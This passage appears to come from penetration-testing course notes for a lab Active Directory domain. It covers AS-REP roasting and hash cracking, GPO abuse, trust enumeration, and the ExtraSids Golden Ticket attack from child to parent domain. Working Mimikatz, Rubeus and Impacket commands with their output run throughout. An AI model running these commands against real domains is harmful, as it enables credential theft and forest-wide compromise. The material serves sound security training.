**Explanation:**
- `-PreauthNotRequired` filters for accounts with the `DONT_REQ_PREAUTH` UAC flag set.
- `mmorgan` is vulnerable — their AS-REP hash can be requested and cracked offline.

---

### Retrieving AS-REP in Proper Format using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

[*] Action: AS-REP roasting
[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE...
```

**Explanation:**
- `asreproast` requests an AS-REP without sending a pre-authentication timestamp — no domain credentials context required, just the SAM name.
- `/format:hashcat` formats the output directly for Hashcat mode 18200.
- `/nowrap` prevents column wrapping so the hash can be copied directly.

---

### Cracking the Hash Offline with Hashcat

```bash
$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e...25c6ca:Welcome!00

Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
```

**Explanation:**
- Mode `18200` is for Kerberos 5 AS-REP etype 23 (RC4).
- Cracked password: `Welcome!00` — now usable for direct authentication as `mmorgan`.

---

### Retrieving the AS-REP Using Kerbrute

```bash
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

2022/04/01 13:14:17 >  [+] VALID USERNAME: sbrown@inlanefreight.local
...
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3...
```

**Explanation:**
- Kerbrute automatically retrieves the AS-REP for any users found without pre-auth during user enumeration — combining enumeration and hash retrieval in one step.

---

### Hunting for Users with Kerberos Pre-auth Not Required (Linux — GetNPUsers.py)

```bash
$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345...
```

**Explanation:**
- `GetNPUsers.py` from Impacket feeds a list of valid usernames and attempts AS-REP roasting for each one.
- `valid_ad_users` is a text file of valid usernames (obtained from Kerbrute or other enumeration).
- Users without the flag get a `[-]` error; any vulnerable accounts return their hash.
- Even if the hash cannot be cracked, **always report this as a finding** — it's a risk even if the current password is strong.

---

## 24.12 Group Policy Object (GPO) Abuse

Group Policy is an excellent hardening tool when used correctly, but if we gain rights over a GPO via ACL misconfiguration, we can leverage it for lateral movement, privilege escalation, domain compromise, and persistence. GPO abuse can be enumerated with PowerView, BloodHound, and tools like **group3r**, **ADRecon**, and **PingCastle**.

GPO misconfigurations can be abused to:
- Add additional privileges to a user (e.g., `SeDebugPrivilege`, `SeImpersonatePrivilege`)
- Add a local admin user to one or more hosts
- Create an immediate scheduled task on hosts for code execution

---

### Enumerating GPO Names with PowerView

```powershell
PS C:\htb> Get-DomainGPO | select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

**Explanation:**
- Shows what types of security measures are in place — denying CMD access, a separate password policy for service accounts, and so on.
- `AutoLogon` in the list may mean there's a readable password in a GPO.
- `Certificate Services` indicates AD CS is present in the domain.

---

### Enumerating GPO Names with a Built-In Cmdlet

```powershell
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
...
Deny Control Panel Access
```

**Explanation:**
- `Get-GPO -All` achieves the same result using the built-in GroupPolicy PowerShell module (requires Group Policy Management Tools installed).

---

### Enumerating Domain User GPO Rights

```powershell
PS C:\htb> $sid = Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
AceQualifier          : AccessAllowed
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
```

**Explanation:**
- Gets the SID for Domain Users and checks if they have any rights over GPOs.
- The output shows Domain Users have `WriteProperty` and `WriteDacl` over this GPO — any domain user could gain full control over it and push malicious settings to all OUs the GPO is linked to.

---

### Converting GPO GUID to Name

```powershell
PS C:\htb> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
```

**Explanation:**
- Resolves the GPO GUID to the human-readable name **"Disconnect Idle RDP"**.
- In BloodHound, Domain Users show `GenericWrite`, `WriteOwner`, and `WriteDacl` over this GPO — confirming full control potential.
- The GPO is applied to the **APPLICATION OU** containing multiple computer objects.

> Use **SharpGPOAbuse** to exploit writable GPOs — add local admin users, create scheduled tasks, or configure startup scripts on affected hosts. Be careful: modifications apply to **every computer in the linked OU**. Target specific hosts where possible and always document every change.

---

### Further Research Recommended

Familiarize yourself with the following topics for more advanced AD attacking:
- **Active Directory Certificate Services (AD CS) attacks**
- **Kerberos Constrained Delegation**
- **Kerberos Unconstrained Delegation**
- **Kerberos Resource-Based Constrained Delegation (RBCD)**

---

# 25. Domain Trusts Primer

## 25.1 Scenario — Why Trusts Matter

Many large organizations acquire new companies over time and establish a trust relationship with the new domain to avoid migrating all established objects — making integration much quicker. However, this trust can also introduce weaknesses into the environment. A subdomain with an exploitable flaw can provide a quick route into the target domain. Companies may also establish trusts with MSPs, customers, or other business units in different geographical regions.

Domain trusts are often set up incorrectly and provide critical unintended attack paths. Trusts set up for convenience may never be reviewed for security implications. A **Merger & Acquisition (M&A)** can result in bidirectional trusts with acquired companies, unknowingly introducing risk if the acquired company's security posture is untested. An attacker targeting an organization may look at a softer trusted domain to gain an indirect foothold. It is not uncommon to perform Kerberoasting against a domain outside the principal domain and obtain a user with admin access within it.

> **Key reporting note:** During assessments, we often find that the larger organization is completely unaware that a trust relationship exists with one or more domains. Always document and report all discovered trusts.

---

## 25.2 Domain Trusts Overview

A trust creates a link between the authentication systems of two domains, allowing users to access resources outside their home domain. Trusts can allow one-way or two-way (bidirectional) communication.

### Trust Types

| Trust Type | Description |
|---|---|
| **Parent-Child** | Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent (e.g., `corp.inlanefreight.local` ↔ `inlanefreight.local`) |
| **Cross-link** | A trust between child domains to speed up authentication — skips going through the root |
| **External** | A non-transitive trust between two separate domains in separate forests not joined by a forest trust; uses SID filtering to filter out authentication requests not from the trusted domain |
| **Tree-root** | A two-way transitive trust between a forest root domain and a new tree root domain; created by design when setting up a new tree root domain |
| **Forest** | A transitive trust between two forest root domains |
| **ESAE** | A bastion forest used to manage Active Directory (also called the Red Forest model) |

### Transitivity

| Transitive | Non-Transitive |
|---|---|
| Shared, 1 to many | Direct trust only |
| Trust is shared with anyone in the forest | Not extended to next-level child domains |
| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |

**Analogy:** A transitive trust is like extending permission to anyone in your household (forest) to accept a package on your behalf. A non-transitive trust is giving strict orders that only you and the delivery service can handle the package — no one else in the household can sign for it.

### Trust Direction

- **One-way trust:** Users in the *trusted* domain can access resources in the *trusting* domain — not vice-versa.
- **Bidirectional trust:** Users from both domains can access resources in the other. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in either domain can access resources in the other.

---

## 25.3 Enumerating Trust Relationships

### Using Get-ADTrust

```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustType               : Uplevel
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustType               : Uplevel
UsesAESKeys             : False
UsesRC4Encryption       : False
```

**Explanation:**
- Especially useful when limited to built-in tools only.
- The output shows two trusts from `INLANEFREIGHT.LOCAL`:
  - `LOGISTICS.INLANEFREIGHT.LOCAL` — `IntraForest: True` confirms this is a **child domain** within the same forest; `ForestTransitive: False`.
  - `FREIGHTLOGISTICS.LOCAL` — `ForestTransitive: True` confirms this is a **cross-forest trust / external trust**.
- Both trusts are `BiDirectional` — users can authenticate back and forth across both. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across it.

---

### Checking for Existing Trusts using Get-DomainTrust

```powershell
PS C:\htb> Get-DomainTrust

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

**Explanation:**
- PowerView's `Get-DomainTrust` provides a cleaner, more readable output than `Get-ADTrust`.
- `WITHIN_FOREST` = parent-child intra-forest trust; `FOREST_TRANSITIVE` = cross-forest trust.
- Beneficial once a foothold is obtained and we plan to compromise the environment further.

---

### Using Get-DomainTrustMapping

```powershell
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : FREIGHTLOGISTICS.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:08 PM
WhenChanged     : 2/27/2022 12:02:41 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
```

**Explanation:**
- `Get-DomainTrustMapping` maps all trust relationships from **all discovered domains**, not just the current one.
- Shows bidirectional trusts from both perspectives (A→B and B→A), giving a complete picture of the forest trust topology.
- From here, we can begin enumeration across trusts — for example, checking users in the child domain:

```powershell
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

samaccountname
--------------
htb-student_adm
Administrator
Guest
lab_adm
krbtgt
```

---

### Using netdom to Query Domain Trust

```cmd
C:\htb> netdom query /domain:inlanefreight.local trust

Direction Trusted\Trusting domain                         Trust type
========= =======================                         ==========

<->       LOGISTICS.INLANEFREIGHT.LOCAL
Direct
 Not found

<->       FREIGHTLOGISTICS.LOCAL
Direct
 Not found

The command completed successfully.
```

### Using netdom to Query Domain Controllers

```cmd
C:\htb> netdom query /domain:inlanefreight.local dc

List of domain controllers with accounts in the domain:

ACADEMY-EA-DC01
The command completed successfully.
```

### Using netdom to Query Workstations and Servers

```cmd
C:\htb> netdom query /domain:inlanefreight.local workstation

List of workstations with accounts in the domain:

ACADEMY-EA-MS01
ACADEMY-EA-MX01      ( Workstation or Server )
SQL01      ( Workstation or Server )
ILF-XRG      ( Workstation or Server )
MAINLON      ( Workstation or Server )
CISERVER      ( Workstation or Server )
INDEX-DEV-LON      ( Workstation or Server )
...SNIP...

The command completed successfully.
```

**Explanation:**
- `netdom query` uses the built-in Windows `netdom` command-line tool — no additional tools needed.
- `trust` lists all trust relationships; `dc` lists Domain Controllers; `workstation` lists workstations and servers registered in the domain.
- Useful when restricted to only built-in Windows tools on a client system.

---

### Visualizing Trust Relationships in BloodHound

Use the **Map Domain Trusts** pre-built query in BloodHound to visually confirm trust relationships. In our environment, this shows two bidirectional trusts — `INLANEFREIGHT.LOCAL` connected to both `LOGISTICS.INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`.

---

### Onwards

In the following sections, we cover attacks against child→parent domain trusts and bidirectional forest trusts. Always check with the client to ensure any trusts uncovered during enumeration are **in scope** and within the **Rules of Engagement** before attacking across them.

---

# 26. Attacking Domain Trusts — Child → Parent (Windows)

## 26.1 SID History Primer

The `sidHistory` attribute is used in migration scenarios. When a user is migrated from one domain to another, a new account is created in the second domain and the original user's SID is added to the new account's `sidHistory` — ensuring continued access to resources in the original domain. SID history is intended to work across domains but can also work within the same domain. Using Mimikatz, an attacker can perform **SID history injection** — adding the SID of a privileged account (e.g., Domain Admin, Enterprise Admin) to the `sidHistory` of an account they control. When authenticating, all SIDs in `sidHistory` are added to the user's token, granting those privileges.

---

## 26.2 ExtraSids Attack — Overview and Requirements

This attack allows compromise of a **parent domain** once the **child domain** has been compromised. Within the same AD forest, the `sidHistory` property is respected due to a lack of SID Filtering protection. SID Filtering is a protection that filters out authentication requests from another forest across a trust — but it does **not** apply within the same forest. By setting a child domain user's `sidHistory` to the Enterprise Admins SID (which only exists in the parent domain), they are treated as a member of that group — giving administrative access to the entire forest. We are creating a **Golden Ticket** from the compromised child domain to compromise the parent domain.

**Data required:**
1. **KRBTGT NT hash** for the child domain
2. **SID of the child domain**
3. **Name of a target user** (does not need to exist — can be fake)
4. **FQDN of the child domain**
5. **SID of the Enterprise Admins group** of the root domain

---

## 26.3 ExtraSids Attack with Mimikatz

### Obtaining the KRBTGT Account's NT Hash using Mimikatz

The **KRBTGT** account is the service account for the Key Distribution Center (KDC) in Active Directory. It is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use its password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create TGT tickets usable to request TGS tickets for any service on any host in the domain — this is the **Golden Ticket attack**, a well-known persistence mechanism. The only way to invalidate a Golden Ticket is to **change the KRBTGT password twice** — which should always be done after an assessment where full domain compromise is reached.

```powershell
PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

**Explanation:**
- DCSync performed against the child domain's `krbtgt` account.
- `Hash NTLM: 9d765b482771505cbe97411065964d5f` — this is the KRBTGT NT hash needed for the Golden Ticket.
- The **Object Security ID** also reveals the child domain SID: `S-1-5-21-2806153819-209893948-922872689`.

---

### Using Get-DomainSID

```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

**Explanation:**
- Returns the SID for the current (child) domain — also visible in the Mimikatz DCSync output above.

---

### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

**Explanation:**
- Retrieves the SID of the Enterprise Admins group from the parent domain.
- Could also use: `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.
- The full SID `S-1-5-21-3842939050-3880317879-2865463114-519` is used as the `/sids:` parameter in the Golden Ticket.

**Collected data points:**
- KRBTGT hash: `9d765b482771505cbe97411065964d5f`
- Child domain SID: `S-1-5-21-2806153819-209893948-922872689`
- Target user (fake): `hacker`
- Child domain FQDN: `LOGISTICS.INLANEFREIGHT.LOCAL`
- Enterprise Admins SID: `S-1-5-21-3842939050-3880317879-2865463114-519`

---

### Using ls to Confirm No Access (Before Attack)

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

**Explanation:**
- Confirms we currently have no access to the parent domain DC's filesystem — used as a baseline before the attack.

---

### Creating a Golden Ticket with Mimikatz

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

**Explanation:**
- `kerberos::golden` creates a forged TGT (Golden Ticket).
- `/user:hacker` — fake username embedded in the ticket (does not need to exist in AD).
- `/domain:` — child domain FQDN.
- `/sid:` — child domain SID.
- `/krbtgt:` — child domain KRBTGT NT hash.
- `/sids:` — **Enterprise Admins SID from the parent domain** — this is the critical parameter that grants access to the entire parent domain/forest.
- `/ptt` — Pass-the-Ticket; injects the ticket directly into the current session.
- The `Lifetime` is set 10 years into the future — the ticket won't expire normally.

---

### Confirming a Kerberos Ticket is in Memory Using klist

```powershell
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

**Explanation:**
- The forged TGT for the non-existent `hacker` user is now cached in memory with a 10-year validity.

---

### Listing the Entire C: Drive of the Parent Domain Controller

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free
```

**Explanation:**
- With the Golden Ticket in memory, we now have full access to the parent domain DC's filesystem — confirming successful cross-domain escalation.
- From here, the parent domain can be compromised in multiple ways.

---

## 26.4 ExtraSids Attack with Rubeus

### Using ls to Confirm No Access Before Running Rubeus

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
...
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

### Creating a Golden Ticket using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

[*] Action: Build TGT

[*] Building PAC
[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi): doIF0zCCBc+gAwIBBa...SNIP...

[+] Ticket successfully imported!
```

**Explanation:**
- `/rc4:` — NT hash of the child domain's KRBTGT account.
- `/sids:` — Enterprise Admins SID from the parent domain (the critical escalation parameter).
- `/ptt` — injects the ticket directly into memory.
- The `ExtraSIDs` field in the output confirms the parent domain's Enterprise Admins SID was embedded.

---

### Confirming the Ticket is in Memory Using klist (Rubeus)

```powershell
PS C:\htb> klist

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
    Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
    Start Time: 3/29/2022 10:06:41 (local)
    End Time:   3/29/2022 20:06:41 (local)
    Renew Time: 4/5/2022 10:06:41 (local)
    Session Key Type: RSADSI RC4-HMAC(NT)
    Cache Flags: 0x1 -> PRIMARY
    Kdc Called:
```

---

### Performing a DCSync Attack Against the Parent Domain (lab_adm)

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

**Explanation:**
- With the Golden Ticket in memory granting Enterprise Admin rights in the parent domain, Mimikatz can DCSync against the parent DC.
- Targeting `lab_adm` retrieves the Domain Admin's NTLM hash from the parent domain.

When dealing with multiple domains where the target domain differs from the user's domain, specify `/domain:` explicitly:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
...
Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
```

**Explanation:**
- `/domain:INLANEFREIGHT.LOCAL` explicitly directs Mimikatz to the parent domain controller when operating from a session context in the child domain.

> **Next Steps:** Now that we've walked through child→parent domain compromise from a Windows attack host, the next section covers the same attack from a Linux attack host.

---

# 27. Attacking Domain Trusts — Child → Parent (Linux)

The same ExtraSids attack can be performed from a Linux attack host using Impacket tools. The same five data points are required:
1. KRBTGT NT hash for the child domain
2. SID for the child domain
3. Name of a target user (does not need to exist)
4. FQDN of the child domain
5. SID of the Enterprise Admins group of the root domain

---

## 27.1 Performing DCSync with secretsdump.py

```bash
$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

**Explanation:**
- Authenticates to the child domain DC (`172.16.5.240`) and DCsyncs only the `krbtgt` account.
- `-just-dc-user LOGISTICS/krbtgt` limits the dump to one account.
- NT hash: `9d765b482771505cbe97411065964d5f` — needed for `ticketer.py`.

---

## 27.2 Brute Forcing SIDs with lookupsid.py

### Performing SID Brute Forcing using lookupsid.py

```bash
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
